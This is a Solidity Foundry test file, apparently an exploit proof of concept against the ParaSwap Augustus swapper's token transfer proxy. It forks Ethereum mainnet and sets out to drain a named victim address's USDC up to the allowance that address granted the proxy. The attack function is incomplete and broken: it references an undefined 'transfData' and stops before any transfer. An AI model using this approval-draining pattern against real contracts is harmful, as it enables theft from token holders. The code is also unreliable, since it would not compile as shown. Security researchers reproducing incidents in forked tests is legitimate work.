// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";


interface ITokenTransferProxy {
    function transferFrom(
        address token,
        address from,
        address to,
        uint256 amount
    ) external;
}

interface IAugustusSwapper {
    function simpleSwap(Utils.SimpleData memory data) external payable returns (uint256 receivedAmount);
}

library Utils {
    struct SimpleData {
        address fromToken;
        address toToken;
        uint256 fromAmount;
        uint256 toAmount;
        uint256 expectedAmount;
        address[] callees;
        bytes exchangeData;
        uint256[] startIndexes;
        uint256[] values;
        address payable beneficiary;
        address payable partner;
        uint256 feePercent;
        bytes permit;
        uint256 deadline;
        bytes16 uuid;
    }
}

contract encodTest is Test {
    IAugustusSwapper AugustusSwapper = IAugustusSwapper(0x59C7C832e96D2568bea6db468C1aAdcbbDa08A52);
    address constant vic = 0x249c90E06941F22b5746fE235126df75870738BC;
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ITokenTransferProxy Augproxy = ITokenTransferProxy(0x1bD435F3C054b6e901B7b108a0ab7617C808677b);
    address attacker = 0x59C7C832e96D2568bea6db468C1aAdcbbDa08A52;


    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 20763484);
        vm.deal(address(weth), 50 ether);
        attacker = msg.sender;

    }

    function testExploit() external {
        attack();
    }

    function attack() internal {
        IERC20(usdc).approve(address(Augproxy), IERC20(usdc).balanceOf(address(this)));

        uint256 allowance = usdc.allowance(vic, address(Augproxy));
        uint256 balance = usdc.balanceOf(vic);
        uint256 amuntToDrain = balance < allowance ? balance : allowance;





        bytes memory exchangeData = transfData;
        uint256 lengthOfTransfData = exchangeData.length;

        
    }
}